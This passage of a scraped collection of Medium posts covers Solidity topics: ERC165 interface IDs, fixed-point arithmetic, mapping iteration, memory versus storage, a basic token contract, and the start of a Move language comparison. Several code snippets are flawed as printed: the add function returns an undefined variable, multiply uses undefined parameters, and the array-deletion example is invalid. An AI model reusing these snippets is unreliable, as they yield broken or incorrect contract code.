interfaceID is just:interfaceID = this.function1.selector ^ this.function2.selector ^ this.function3.selector;Pretty simple! Now remember, the reason we began this ERC165 discussion was because our ERC721 contract needs to implement the ERC165 interface, so let\u2019s write our ERC165 implementation (which our ERC721 contract will inherit) to wrap this up.When it comes to Solidity, we want to minimise the gas used. Doing unnecessary calculations costs users money and it wastes the network\u2019s resources. The ERC165 standard actually requires that the supportsInterface function \u201cuse less than 30,000 gas\u201d. So rather than re-calculating interfaceIDs every time someone calls supportsInterface, lets keep our supported interfaceIDs in a mapping.Start our contract, CheckERC165, like this:contract CheckERC165 is ERC165 {    mapping (bytes4 => bool) internal supportedInterfaces;This way, the supportsInterface function just has to return a value from the mapping, here\u2019s that whole function implemented:function supportsInterface(bytes4 interfaceID) external view returns (bool){    return supportedInterfaces[interfaceID];}Great! Our contract now implements all the functions in the ERC165 interface (there\u2019s only one). Let\u2019s add the ERC165 interfaceID to supportedInterfaces and bring this thing full circle.Solidity Version 0.4.22 was recently released, giving us the easier constructor function name for our constructor. So let\u2019s make a constructor, and in it, add the interfaceID of the ERC165 interface.constructor() public {    supportedInterfaces[this.supportsInterface.selector] = true;}Now if anyone calls supportsInterface with the interfaceID of the ERC165 Standard interface ( 0x01ffc9a7), it will return true.And that\u2019s it for ERC165! The complete contract is available on my GitHub. We\u2019ll be using this later with our ERC721 implementation, and it\u2019s also a handy one to have in the bag when dealing with interfaces in general.The ERC721 InterfacesNow that we know about interfaces, let\u2019s move back to ERC721. You\u2019ll notice that the ERC721 Standard actually contains four different interfaces. One main one for a general ERC721 contract, one for contracts that can receive ERC721 tokens, and two for optional extensions which add extra functionality. We\u2019ll ignore the extensions for now, and just have a quick look at the main interface and the receiver.Payable Functions and MutabilitySomething that immediately stood out to me was that four of the functions in the ERC721 interface have the payable modifier. Namely the two safeTransferFrom functions, transferFrom and approve. It didn\u2019t really make sense that an ERC721 contract should always take payment every time a token is transferred, or control of a token is granted.You can probably imagine situations where this may be the case \u2014 if you build a marketplace for your NFTs, then no doubt you\u2019ll be dealing with payments \u2014 but situations where a token owner has to pay just to grant control of a token to someone else is harder to imagine. And in fact, the reason for the payable modifiers isn\u2019t very sexy, it all comes down to mutability.From the caveats section of the ERC721 Standard:\u201cMutability guarantees are, in order weak to strong: payable, implicit nonpayable, view, and pure.\u201dSo by marking these functions as payable, it was simply a way for the authors to say that there is no restriction on mutability required. In this particular instance, payable is just a way of explicitly saying nothing is restricted. Your implementations may be stricter, but not weaker.There are two ways to deal with this, you can either:keep these functions as payable, and just return any Ether that gets sent with transactions (or keep it if that\u2019s your design), orremove the payable modifier, but you\u2019ll have to do the same thing in your copy of the ERC721 interface in order to avoid throwing a TypeError.Remember from earlier that function selectors aren\u2019t affected by modifiers, so this won\u2019t interfere with the interfaceID. The same is true for functions marked external, you should feel free to change them to public as needed.ERC721TokenReceiverBefore I wrap up I want to quickly cover the ERC721TokenReceiver interface. This isn\u2019t something our token contract needs to inherit. As the name implies, it\u2019s an interface for contracts that can receive ERC721 tokens.Since I won\u2019t be covering making a wallet contract in this series, lets quickly make a couple of dummy wallets that we\u2019ll use for testing later. One valid receiver, and one invalid receiver.For our purposes, the only important bit of information is that a valid ERC721TokenReceiver will implement the functionfunction onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4);and returnbytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))An invalid one will either not implement that function, or return literally anything else. So lets define our two receivers as follows:contract ValidReceiver is ERC721TokenReceiver {    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4){        return bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"));    } }andcontract InvalidReceiver is ERC721TokenReceiver {    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4){        return bytes4(keccak256(\"some invalid return data\"));    } }We won\u2019t use these until much later when we\u2019re doing tests, so just save them and keep them in your pocket. I just wanted to cover them now while we\u2019re doing an overview of the interfaces.Wrapping upSo after all that, you should be familiar with interfaces, and have an ERC165 implementation which you can use for indicating which interfaces are implemented by your contract. We also covered mutability guarantees in the ERC721 standard, and quickly wrote a couple of dummy wallet contracts for testing later.In the next post, we\u2019ll use everything we\u2019ve covered so far, and start writing the actual ERC721 token contract.Next: Jumping into Solidity \u2014 The ERC721 Standard (Part 3)", "responses": 0, "tags": ["Ethereum", "Solidity", "Programming", "Tutorial", "Dapps"]}, {"title": "Fixed point math in Solidity", "post_link": "https://medium.com/cementdao/fixed-point-math-in-solidity-616f4508c6e8?source=search_post", "author_name": "Alberto Cuesta Ca\u00f1ada", "author_link": "https://medium.com/@albertocuestacanada", "publish_date": "2019-04-22", "last_modified_date": "2019-04-24", "readtime": "8.52", "claps": 405, "voters": 35, "content": "Fixed point math in SolidityAlberto Cuesta Ca\u00f1adaFollowApr 22 \u00b7 9 min readIt always seems impossible until it\u2019s done. \u2014 Nelson MandelaIntroductionAny financial application with a minimum of complexity will need some decimal support and multiplications to calculate things like interest. In the case of CementDAO we needed logarithms to implement the transaction fee curve that steers its cryptocurrency basket towards the desired configuration.Solidity supports integers but no decimals, so we coded a fixed point arithmetic contract, made it safe against overflow, and tested it extensively. It underpins the CementDAO deployment in Ropsten.The Fixidity contract is available from the CementDAO github with a MIT license, please feel free to use it and build upon it.ImplementationIn order to code this we went from the simplest to the most complex arithmetic functions, implementing overflow assertions, mathematically finding the limits of the functions and testing for any special cases like zero, one, n, n plus one, limit minus one, limit and limit plus one. Higher order functions were implemented to reuse lower order ones.DigitsThe maximum representable integer in 256 bits has 76 digits, and we arbitrarily decided to allocate 24 digits to the decimal part and the other 52 to the integer part. We considered that to be a fair choice in terms of capabilities, as it allows multiplication of larger numbers in exchange of precision loss of very small fractional parts. Changing the number of decimals is possible just by recalculating the constants in the contract.ConversionIf you would have a decimal number or a float and would like to convert it to a fixed point representation you would displace the comma to the right a fixed number of positions, or \u201cdigits\u201d. As a mathematical operation this is newFixed(x) = x * 10**digits. When you do this with a decimal number you have to discard any remaining decimals after the conversion, but since we are working with Solidity (which doesn\u2019t have decimals) this isn\u2019t an issue for us.To convert back from fixed point you do the inverse operation, fromFixed(x) = x / 10**digits, being mindful that very small fixed point numbers would get rounded off to zero.The contract offers a few useful functions to convert between different fixed point representations, for example from 24 to 18 digits.Overflow in conversionConversion to fixed point will overflow if the number being converted has more integer digits that fit in the bits reserved for them in the fixed point representation. If max_int256 == 2**255\u20131, then max_newFixed = max_int256 / 10**digits.Likewise if min_int256 == (-1)*2**255, min_newFixed = min_int256 / 10**digits. Note that there is one more negative number than positive numbers in the int256.In FixidityLib the conversion functions will revert if you try to convert a number above those limits, but you should implement your own safeguards in your contracts to warn users early enough that they are dealing in numbers too large for the contract.function newFixed(int256 x)        public        pure        returns (int256)    {        assert(x <= max_newFixed());        assert(x >= min_newFixed());        return x * fixed_1();    }A number that will come useful in many cases is fixed_1, the fixed point representation of 1, which can be expressed as fixed_1 = 10**digits. As you can see, converting to and from fixed point representation is the same as multiplying and dividing by fixed_1.To extract the integer and decimal parts of a fixed point number you can use the same shortcut. Integer(x) = (x/fixed_1)*fixed_1 \u2014 Please be aware that integer(x) returns the integer part of x but still in fixed point representation, so it is the same as replacing all decimal digits with zeros. To retrieve just the decimal part we can use Fractional(x) = x % fixed_1.function integer(int256 x) public pure returns (int256) {        return (x / fixed_1()) * fixed_1(); // Can't overflow    }    function fractional(int256 x) public pure returns (int256) {        return x - (x / fixed_1()) * fixed_1(); // Can't overflow    }Using a struct instead of int256One of the earliest pieces of feedback we got is that using a struct for our fixed point values instead of int256 would be much safer, and we agree. Such a struct would be something like:Struct Fixed {        int256 value;        uint8 digits; // Inefficient, but possibly necessary    }Using a struct would help any application using the Fixidity library to make much more robust applications, it is certainly confusing that an int256 can be both a normal integer or a fixed point number, with no way of knowing which except by analysing the program flow. However, we haven\u2019t yet coded it, as adding the struct to the Fixidity library would create a bit of internal complexity, and we can manage for our specific use case. We welcome contributions in this aspect as in any other. Regardless, we may make this change the next time we implement anything with fixed point arithmetic.Addition and subtractionAddition operations between fixed point numbers are identical to normal integers and no additional care is required to keep track of integer and decimal parts. The only tricky bit is that they can overflow and that max_int + 1 == min_int. Addition of negative numbers means that you need to be careful of overflowing from the lower end as well.The usual overflow protection mechanism is x + y = z; assert(z \u2014 y = x), but that doesn\u2019t work in the complement to two representation of solidity, and gave me a bit of a headache.At the end you can protect yourself against overflow with a bit of logic:Only the addition of two positives can overflow through the top.Only the addition of two negatives can overflow through the bottom.The addition of a negative and a positive can never overflow.The addition of a negative or a positive to zero can never overflow.The addition of two positives cannot overflow by an amount greater than abs(min_int).The addition of two different negatives cannot overflow by an amount greater than abs(max_int).If an overflow occurs the result will be zero or have the opposite sign to what would be expected.With these rules we just need to assert as follows:function add(int256 x, int256 y) public pure returns (int256) {        int256 z = x + y;        if(x > 0 && y > 0) assert(z > x && z > y);        if(x < 0 && y < 0) assert(z < x && z < y);        return t;    }function subtract(int256 x, int256 y) public pure returns (int256) {        return add(x,-y);    }Multiplication and divisionThe multiplication operation is conditioned by the fact that a number in fixed point representation is actually the following combination:fixed(x) = numbers_to_left_of_comma(x)*10**digits() + numbers_to_right_of_comma(x)In the following formulas, this is written as x = x1*fixed1 + x2.When multiplying two fixed point numbers though we need to be conscious that the comma needs to stay in the right spot and if we simply multiply the numbers we will get the wrong result and be very likely to overflow at the same time:x = x1*fixed_1 + x2y = y1*fixed_1 + y2x * y = (x1*fixed_1 + x2) * (y1*fixed_1 + y2)x * y = ((x1*fixed_1) * (y1*fixed_1)) + ((x1*fixed_1) * (y2)) + ((y1*fixed_1 * x2)) + (x2 + y2)To keep the comma in the right place the first term of the decomposition needs to be swapped from (x1*fixed_1) * (y1*fixed_1) to (x1*y1)*fixed_1, which at the same time makes overflows less likely.We still need to test for overflow. This is because x1*y1 will be greater than max_int if, for example, both x1 and y1 are greater than sqrt(max_int). We are also multiplying the result by fixed_1 which presents another chance for overflow.For the multiplication case the traditional overflow check works:x * y = z; assert(z / y = x)Which leaves the solidity code as:int256 x1 = integer(x) / fixed_1();        int256 x2 = fractional(x);        int256 y1 = integer(y) / fixed_1();        int256 y2 = fractional(y);         int256 x1y1 = x1 * y1;        if (x1 != 0) assert(x1y1 / x1 == y1);              int256 fixed_x1y1 = x1y1 * fixed_1();        if (x1y1 != 0) assert(fixed_x1y1 / x1y1 == fixed_1());        x1y1 = fixed_x1y1;The rest of the terms of the multiplication don\u2019t need adjustment for the comma, but we still need to check for overflow at each internal multiplication or addition operations, since all of them can overflow.function multiply(int256 x, int256 y) public pure returns (int256) {    if(x == 0 || y == 0) return 0;    if(y == fixed_1()) return x;    if(x == fixed_1()) return y;    // Separate into integer and fractional parts    // x = x1 + x2, y = y1 + y2    int256 x1 = integer(a) / fixed_1();    int256 x2 = fractional(a);    int256 y1 = integer(b) / fixed_1();    int256 y2 = fractional(b);    // (x1+x2) * (y1+y2) = (x1*y1) + (x1*y2) + (x2*y1) + (x2*y2)    int256 x1y1 = x1 * y1;    if (x1 != 0) assert(x1y1 / x1 == y1); // Overflow x1y1    // x1y1 needs to be multiplied back by fixed_1    int256 fixed_x1y1 = x1y1 * fixed_1();    if (x1y1 != 0) assert(fixed_x1y1 / x1y1 == fixed_1());    x1y1 = fixed_x1y1;    int256 x2y1 = x2 * y1;    if (x2 != 0) assert(x2y1 / x2 == y1); // Overflow x2y1    int256 x1y2 = x1 * y2;    if (x1 != 0) assert(x1y2 / x1 == y2); // Overflow x1y2    x2 = x2 / mul_precision();    y2 = y2 / mul_precision();    int256 x2y2 = x2 * y2;    if (x2 != 0) assert(x2y2 / x2 == y2); // Overflow x2y2    // result = fixed_1()*x1*y1 + x1*y2 + x2*y1 + x2*y2/fixed_1();    int256 result = x1y1;    result = add(result, x2y1); // Add checks for overflow    result = add(result, x1y2); // Add checks for overflow    result = add(result, x2y2); // Add checks for overflow    return result;}Once the multiplication operation is ready, we can just code the division as x / y = x * (1/y); knowing that 1/y > y and therefore can\u2019t overflow. We still need to keep the comma in the right place, though:function reciprocal(int256 x) public pure returns (int256) {        assert(x != 0);        return (fixed_1()*fixed_1()) / x; // Can't overflow    }We introduced an assert to stop divisions by numbers above fixed_1()*fixed_1() as that would make reciprocal(x) = 0 and revert the division.function divide(int256 x, int256 y) public pure returns (int256) {        if(y == fixed_1()) return x;        assert(y != 0);        assert(y <= max_fixed_divisor());        return multiply(x, reciprocal(y));    }How did we test it?Correct testing was the most important part of this implementation. Most of our initial function assumptions and implementations were wrong and we only discovered this through testing. It is notoriously difficult to carry in your mind all the rules about managing the comma, and even harder to understand when and how operations overflow. In total, tests produced three times as much code as the library itself.When implementing tests our policy was to write a test for each assert, a test for the assumed limits just before a function overflows, and another test to verify behaviour on overflow. We thought that writing clear constants for safe operation was critical, and in a way these tests were all about the safe operation limits. A good example are the tests for the add function:/** * @dev a+b. If any operator is higher than max_fixed_add() it * might overflow. * In solidity max_int256 + 1 = min_int256 and viceversa. * Test add(max_fixed_add(),max_fixed_add()) returns max_int256()-1 * Test add(max_fixed_add()+1,max_fixed_add()+1) fails * Test add(-max_fixed_sub(),-max_fixed_sub()) returns min_int256() * Test add(-max_fixed_sub()-1,-max_fixed_sub()-1) fails * Test add(max_int256(),max_int256()) fails * Test add(min_int256(),min_int256()) fails */For the multiply function we had code additional tests, because an overflow can happen in each one of the internal operations so we needed to debug all the combinations of integer and fractional versus the other integer and fractional. See below, this one was a bastard./** * @dev a*b. If any of the operators is higher than    * max_fixed_mul() it might overflow. * Test multiply(0,0) returns 0 * Test multiply(max_fixed_mul(),0) returns 0 * Test multiply(0,max_fixed_mul()) returns 0 * Test multiply(max_fixed_mul(),fixed_1()) returns max_fixed_mul() * Test multiply(fixed_1(),max_fixed_mul()) returns max_fixed_mul() * Test combinations of (2,-2), (2,2.5), (2,-2.5) and (0.5, -0.5) * Test multiply( *   fixed_1()/mul_precision(), *   fixed_1()*mul_precision() * ) * Test multiply(max_fixed_mul()-1,max_fixed_mul())  *   equals multiply(max_fixed_mul(),max_fixed_mul()-1) * Test multiply(max_fixed_mul(),max_fixed_mul())  *   returns max_int256() * Test multiply(max_fixed_mul()+1,max_fixed_mul()) fails * Test multiply(max_fixed_mul(),max_fixed_mul()+1) fails */ConclusionWe didn\u2019t know how difficult would it be, so we did it. And we had so much fun doing so.Now we have a contract that we can use and trust to code financial applications in Solidity, and we are proud and confident enough to release it to the public, knowing that others will find it useful as well.Please feel free to provide any feedback about this library, I\u2019m sure there must still be some bug or edge case hidden somewhere where we couldn\u2019t find it.CementDAO is now live on Ropsten, so join in and take Fixidity for a spin!ThanksTo Gadi Guy for coding the initial library at https://github.com/extraterrestrial-tech/fixidityTo the CementDAO Team: Brendan Quinn (1A1Z), Edan Yago (1A1Z), David Carvalh\u00e3o (Vigil365), Pierre Martin (Vigil365), Bernardo Vieira (TechHQ), and Sergio Pereira (TechHQ).", "responses": 3, "tags": ["Mathematics", "Blockchain", "Ethereum", "Open Source", "Software Development"]}, {"title": "PSA: How to fix GitHub\u2019s syntax highlighting for Solidity", "post_link": "https://medium.com/@danielque/psa-how-to-fix-githubs-syntax-highlighting-for-solidity-4e9867c540b6?source=search_post", "author_name": "Daniel Que", "author_link": "https://medium.com/@danielque", "publish_date": "2018-04-17", "last_modified_date": "2018-08-09", "readtime": "0.72", "claps": 266, "voters": 35, "content": "PSA: How to fix GitHub\u2019s syntax highlighting for SolidityDaniel QueFollowApr 17, 2018 \u00b7 1 min readGitHub doesn\u2019t support detecting .sol files as Solidity for syntax highlighting, and the current best solution is simple but not well known.ProblemGitHub uses linguist to enable language-related features. According to linguist\u2019s maintainers, the .sol file extension is too generic to assign to Solidity.SolutionAdd a .gitattributes file to your repo\u2019s root with the following contents:*.sol linguist-language=SolidityExamples:.gitattribute file.sol file with syntax highlighting workingYou may have to wait a while, or push another commit to .sol files for it to take effect.ConclusionSince .sol can\u2019t be assigned to Solidity, there\u2019s some discussion around assigning .solidity to Solidity instead. This \u201cconsolation prize\u201d is much less than ideal since the current convention has wide usage and deep roots. Changing the convention just to cater to a private git hosting company doesn\u2019t make sense.Perhaps when Solidity becomes popular enough, .sol will also be automatically classified by linguist.More in-depth discussion can be found here.I\u2019m working on CryptoFin, the creators of Bskt and a smart contract auditing firm. You can follow our progress on Telegram.", "responses": 3, "tags": ["Ethereum", "Solidity", "Syntax", "Github", "Highlight"]}, {"title": "Looping in Solidity", "post_link": "https://medium.com/@blockchain101/looping-in-solidity-32c621e05c22?source=search_post", "author_name": "Bernard Peh", "author_link": "https://medium.com/@blockchain101", "publish_date": "2017-10-02", "last_modified_date": "2018-06-14", "readtime": "1.36", "claps": 195, "voters": 31, "content": "Looping in SolidityBernard PehFollowOct 2, 2017 \u00b7 2 min readIn solidity, mapping is very useful to store token value of an address. We have seen it in many contracts and they are normally defined this way:mapping (address => uint) public users;Since the mapping is public, we get a free getter and we can get the value of myAddress by using a simpleusers(myAddress);Solidity mapping might look similar to an associative array at first glance but its not. It doesn\u2019t have indices, making it hard to loop through all addresses. It is still possible though but not straight forward.Arrays are much easier to manage,address[] public addressIndices;// start adding address in arrayaddressIndices.push(newAddress);...// We know the length of the arrayuint arrayLength = addressIndices.length;for (uint i=0; i<arrayLength; i++) {  // do something}Let\u2019s say we want to calculate the total value of all addresses, having an array of addresses can really be helpful.mapping (address => uint) public mappedUsers;address[] public addressIndices;// start adding address in arrayaddressIndices.push(newAddress);// define mappedUsers as wellmappedUsers[newAddress] = someValue;...// We know the length of the arrayuint arrayLength = addressIndices.length;// totalValue auto init to 0uint totalValue;for (uint i=0; i<arrayLength; i++) {  totalValue += mappedUsers[addressIndices[i]];}What if we want to delete the array efficiently? We have to move the array\u2019s last position to the deleted position.uint indexToBeDeleted;mapping (address => uint) public mappedUsers;address[] public addressIndices;uint arrayLength = addressIndices.length;for (uint i=0; i<arrayLength; i++) {  if (addressIndices[i] == addressToBeDeleted) {    indexToBeDeleted = i;    break;  }}// if index to be deleted is not the last index, swap position.if (indexToBeDeleted < arrayLength-1) {  mappedUsers[indexToBeDeleted] = mappedUsers[arrayLength-1];}// we can now reduce the array length by 1addressIndices--;Referring to the code above, assuming we don\u2019t want a for-loop to look for the index of the address to be deleted, we need to record the index of the item in a struct. It gets a bit more complicated if we want to do a proper CRUD.A sample of the full code might look something like this.Happy coding!", "responses": 4, "tags": ["Programming", "Solidity", "Ethereum"]}, {"title": "What the hack is Memory and Storage in Solidity?", "post_link": "https://medium.com/coinmonks/what-the-hack-is-memory-and-storage-in-solidity-6b9e62577305?source=search_post", "author_name": "Sarvesh Jain", "author_link": "https://medium.com/@sarvesh.sgsits", "publish_date": "2018-06-13", "last_modified_date": "2018-07-19", "readtime": "3.45", "claps": 169, "voters": 32, "content": "What the hack is Memory and Storage in Solidity?Sarvesh JainFollowJun 13, 2018 \u00b7 4 min readOne of the most confusing concepts in solidity is how to effectively use memory and storage.This article aims to provide a basic understanding of memory and storage and also demonstrate it\u2019s effective usage with some examples.If you are new to solidity, please read the below articles first:Getting Started with ethereum blockchain development: part-1Getting Started with ethereum blockchain development: Part-2Before we move ahead, let\u2019s understand the different kind of storage that solidity has:Storage: The persistent memory that every account has is called storage. Storage is a key-value store where keys and values are both 32 bytes.Memory: Memory is a byte-array, which hold the data in it until the execution of the function. Memory starts with zero-size and can be expanded in 32-byte chunks by simply accessing or storing memory at indices greater than its current size. To save gas, it is always recommended to shrink it\u2019s size whenever possible.Stack: It is used to hold small local variables. It costs same as memory, but can only hold a limited amount of values.Gas Consumption while consuming spaceThis section of the article assumes that reader has a basic understanding of gas consumption in ethereum, if not refer below link.\ud83d\udc47What is gas in ethereum?Everything you do on ethereum blockchain will cost you some gas. Let\u2019s try to compare gas consumption in storage and memory.Storage Gas consumption: Storage gas cost is easy to understand:It costs 20,000 gas when a value is set to non-zero from zeroIt costs 5,000 gas when writing to existing storage or setting a value to zero.5,000 gas is refunded when a non-zero value is set to zero.Gas savings from packing storage is still possible, such as fitting 2 uint128 values within a single key, instead of using 2 keys.Memory Gas consumption: The gas cost of memory expansion is defined in the Yellow Paper as follows:Gas consumption in memory expansionG_memory is 3, a is the number of 256-bit chunk words allocated.For a =512 chunks, Gas consumption will be (3 * 512 + (512 * 512)/512) = 2560 unitsNote: Cost of memory usage is not very significant as compared to storage. It\u2019s a good practice to always use memory to perform intermediate calculations and store results in storage.Where are variables stored?For each type of variable, there exists default storage location::State variables are always in storage.Function arguments are always in memory.Local variables of struct, array or mapping type reference are stored in storage by default.Local variables of a value type (uint, int etc) are stored in the stack.Let\u2019s deep dive more into this and understand one more important concept around memory and storage !!!Contract description:Contract variable: Mapping to store key-value pair as user Id and User type. mapping(uint => User) users;Methods: Followings are methods in the contract:I. addUser: It takes uint id, uint balance as the argument and adds a user to mapping.II. updateBalance: It takes uint id, uint balance as the argument and updates balance of the user.III. getBalance: It takes uint id as an argument and returns the balance of the user.Call Contract Method: You can run above contract in online Remix IDEI. Create a user by calling addUser method with arguments (id = 1 and balance = 10)II. Update balance of user by calling updateBalance method with arguments(id = 1 and balance = 20)Expected Output: Get the balance of user by calling getBalance method with an argument (id = 1). What do you think is the expected value? Have a guess? Is it 20 or 10 and why?\ud83e\udd14Output is 10 not 20. \ud83d\ude2fExplanation: In solidity, when storage type variable is assigned to memory type it creates a new copy of data. If any update is done on copied data, it will not reflect in the original copy.Can you now guess, what change you need to do in updateBalance method to make it work? \ud83e\udd14Change line 17 in the contract. Changing storage location from memory to storage will not create a new copy of data, rather it will create a pointer to storage. Hence any change in user object will be reflected in the storage itself.User storage user = users[id];Bingo!!! You now have a good understanding of memory and storage in the solidity \ud83d\ude4cIn the next few articles. I will explain about EVM internals and Merkel Pertrica trees.Happy Coding \ud83d\ude07linkedin.com/in/jainsarveshmedium.com/@sarvesh.sgsits", "responses": 1, "tags": ["Ethereum", "Solidity", "Memory", "Storage", "Tutorial"]}, {"title": "How to write a simple token contract in Solidity", "post_link": "https://medium.com/datadriveninvestor/writing-a-simple-token-contract-in-solidity-1c457ab25b1a?source=search_post", "author_name": "Holly Atkinson", "author_link": "https://medium.com/@atkinsonholly", "publish_date": "2019-02-08", "last_modified_date": "2019-02-09", "readtime": "3.99", "claps": 132, "voters": 33, "content": "How to write a simple token contract in SolidityHolly AtkinsonFollowFeb 8 \u00b7 4 min readYes, you can design and issue your very own tradable cryptocurrency. Read on for a brief introduction!Photo by abigail low on UnsplashAccording to Ethereum.org:Ethereum is a decentralized platform that runs smart contracts: applications that run exactly as programmed without any possibility of downtime, censorship, fraud or third-party interference.These apps run on a custom built blockchain, an enormously powerful shared global infrastructure that can move value around and represent the ownership of property.You can code your own digital tokens, which can be deployed onto the Ethereum network.I\u2019ve included a very simple token contract below, for which I used the Remix Ethereum web browser-based IDE.Token StandardsThe native currency for Ethereum is called Ether (ETH). However, anyone can create unique tokens that exist and operate on the Ethereum blockchain, as long as they meet certain minimum standards. Ethereum Request for Comments 20, or ERC-20 is arguably the most well known standard, which includes rules concerning a token\u2019s interface. It provides basic functionality to transfer tokens, in addition to allowing tokens to be approved so they can be spent by another on-chain third party. You may also have seen ERC-721, which relates to \u2018non-fungible\u2019 tokens (CryptoKitties is one example of an ERC-721-compliant crypto collectible) .For the purpose of this short walkthrough, in which I\u2019ll mainly focus on setting up my token contract\u2019s basic structure, I will not focus too much on meeting ERC requirements. However, if you are interested in issuing your own tokens I\u2019d encourage you to dig a little deeper into the goals of various ERC proposals! The Solidity documentation is also very helpful.You can see the top Ethereum-based token contracts (and explore their code!) at https://etherscan.io/tokens.Using Remix to write a simple contractIn this section you\u2019ll see snippets from a very simple contract I made in Remix called \u2018HolCoin\u2019 (great name, you say?). I\u2019ve included a few comments on what each part of the contract is supposed to do. Start your contract with the usual pragma solidity text, and the version that you would like to use. Name your contract and declare its main variables.Starting a new token contractNext, we will write a constructor that will allow the contract to be executed.Contracts can be created \u201cfrom outside\u201d via Ethereum transactions or from within Solidity contracts. When a contract is created, its constructor (a function declared with the constructor keyword) is executed once.A constructor is optional.This makes sense: we only want to create our total HolCoin supply once!Now, I can set HolCoin up with my address as the contract\u2019s owner, a name (\u2018HolCoin\u2019), a symbol (\u2018HOL\u2019) and a total supply, e.g. 10,000.You\u2019ll see that I have also included a mapping, which can be used to obtain the balance of a given address. (For simplicity, you could think of each address as being a different user, however in reality it is important to note that a user can have many addresses.) This is a bit like using a Javascript object. Or, if you\u2019re more familiar with Ruby, a mapping is a bit like a hash, where each named key is a symbol you can access in hash.Create a mapping and contract constructorNow that we have given ourselves a way to create the HolCoin supply, let\u2019s go ahead and add some simple functionality which will allow external parties to interact with our Smart Contract.Below, three functions are shown:totalSupply(), takes no arguments and will return the total HolCoin supply as a uint256;balanceOf(address), will return the balance of coins as a uint256 for a given address using the mapping we defined above;transfer(address, uint256), will transfer an amount of coins to a given address and return true, as long as the person calling the function (msg.sender) has enough coins to send! It will also tell the network that the transfer has occurred, by emitting details of the transfer.Next stepsIf I ever do want to issue real HolCoin on the Ethereum blockchain, I\u2019ll need to tidy up the existing code and add functionality to meet minimum token requirements.For instance, what happens if the person calling the transfer function doesn\u2019t actually have enough coins to send? I should probably communicate this to the person requesting the transfer, and ensure that false is returned when a transfer doesn\u2019t happen.For safety, I should probably carry out more verification before and after sending coins; for instance, I should include a check for overflows.I also haven\u2019t specified decimals here - i.e. how \u2018divisible\u2019 I want my HolCoin tokens to be, as a uint8 from 0 to 18. Furthermore, I might want to be able to decrease the total supply of tokens by \u2018burning\u2019 existing tokens.To test your understanding, can you figure out what key functionality is yet to be included? Hints:transferFromapproveallowanceIf you made it this far, I hope you found this basic introduction useful! I\u2019ll be following up soon with more on Smart Contract development in Solidity.", "responses": 0, "tags": ["Ethereum", "Blockchain", "Smart Contracts", "Solidity", "Solidity Tutorial"]}, {"title": "Facebook\u2019s \u201cMove\u201d Programming Language: How Does It Compare to Solidity and DeepSEA?", "post_link": "https://medium.com/certik/facebooks-move-programming-language-how-does-it-compare-to-solidity-and-deepsea-42cff1ba4c10?source=search_post", "author_name": "CertiK Foundation", "author_link": "https://medium.com/@certik.foundation", "publish_date": "2019-06-21", "last_modified_date": "2019-06-25", "readtime": "6.28", "claps": 1160, "voters": 33, "content": "Facebook\u2019s \u201cMove\u201d Programming Language: How Does It Compare to Solidity and DeepSEA?CertiK FoundationFollowJun 21 \u00b7 7 min readEthereum\u2019s programming language, Solidity, has quickly become one of the most commonly used languages across the blockchain: its flexibility of purpose across Ethereum has led to rapid and widespread adoption by the community, despite shortcomings in intuitiveness and security.With Facebook\u2019s announcement of Libra, a global currency aimed at empowering billions of people, many eyes have begun analyzing Move, its programming language.Another programming language, DeepSEA, was developed by CertiK and the research laboratories of Columbia University and Yale University. DeepSEA, which was awarded research grants from The Columbia-IBM Blockchain Center and The Ethereum Foundation, focuses on intuitively leveraging Formal Verification within the language itself, automatically creating mathematical theorems to prove code correctness.Below, we compare Facebook\u2019s Move with Ethereum\u2019s Solidity and CertiK\u2019s DeepSEA to interpret the differences between the languages, detailing the advantages \u2014 and complications \u2014 therein.SolidityEthereum introduced the idea of smart contracts: while Bitcoin hardcoded the type of data stored on the blockchain, Ethereum allowed developers to customize a system by uploading arbitrary programs that can store any type of data and apply any kind of transaction logic. To implement these smart contracts, Ethereum leveraged a Turing-complete programming language called Solidity.The simplest and most popular application of Solidity was to allow developers to create their own cryptocurrency (a \u201ctoken\u201d), which could be owned and transferred to any Ethereum account. Under the hood, tokens are created by simply uploading a program that stores a large table; this table states how many tokens each user owns (an integer), and exposes a few methods, e.g. the ability to transfer tokens from one account to another:However, in practice, the Ethereum and Solidity experience has not been as smooth as expected. In many respects, the Solidity language has features that are unnecessarily error-prone.For example, numbers can silently overflow if they get too large, exposing the programs to undesirable manipulations. More subtly, the Solidity method call semantics also allow for a vulnerability called a re-entrancy attack, in which contracts are able to be withdrawn twice in a recursive manner. This simple trick was used to exploit Solidity contracts in the past, leading to the theft of hundreds of millions of dollars, including the infamous DAO attack.Another area of exposure in Solidity and Ethereum is in the basic infrastructure. So far, no particular high-profile failure has resulted from this, but there have been bugs found in the Solidity compiler which can lead to insecure contracts (see here or here). Normally a programmer only interacts with the source code of a program, so if the underlying compiler itself has a bug that emits incorrect bytecode, it would be nearly impossible to catch.Even with thorough manual testing and static analysis, these opaque issues may still linger. For that reason, Formal Verification has emerged as the leading method of ensuring the correctness of source code.Although Solidity does not inherently integrate with Formal Verification proof assistants, CertiK has developed a complex proof engine to take Solidity code and prove its correctness, securing it against severe vulnerabilities such as overflows and re-entrancy. While this serves as the most comprehensive method of auditing, it is still a multi-stage process to ensure security due to the framework of the Solidity language,Overall, Solidity is a powerful and flexible language \u2014 but one still vulnerable to major errors. Solidity does not offer any features to prove the correctness of the code (or underlying compilation into the Ethereum virtual machine), so the most robust proof of correctness still requires third-party Formal Verification from CertiK.MoveAs Facebook enters the blockchain world with its Libra initiative, people are anxious to examine the code behind it.While revealing the white paper of its cryptocurrency project, Facebook also introduced a new programming language, Move. Currently there is a single module called LibraAccount, which works like a token contract, but eventually there will be a way for third parties to write additional modules.Compared to Solidity, the Move language is different in three key ways.First, Move limits the expressivity of the language by omitting certain features, mainly dynamic dispatch and general pointers. This would quell the infamous re-entrancy bugs by restricting flexibility at large.The Move designers claim that these restrictions will make it easier to write Formal Verification tools for Move in the future \u2014 these tools do not currently exist, but the Facebook team makes it evident that the team is aware of the advantages and importance of Formal Verification.Under future work Facebook writes:\u201cWe will create a logical specification language and automated formal verification tool that leverage Move\u2019s verification-friendly design (see Section 3.4). The verification toolchain will check program-specific functional correctness properties that go beyond the safety guarantees enforced by the Move bytecode verifier (Section 5.2).\u201dSecond, Move supports \u201cresource types\u201d (inspired by linear type systems). A module can declare a particular type of data to be 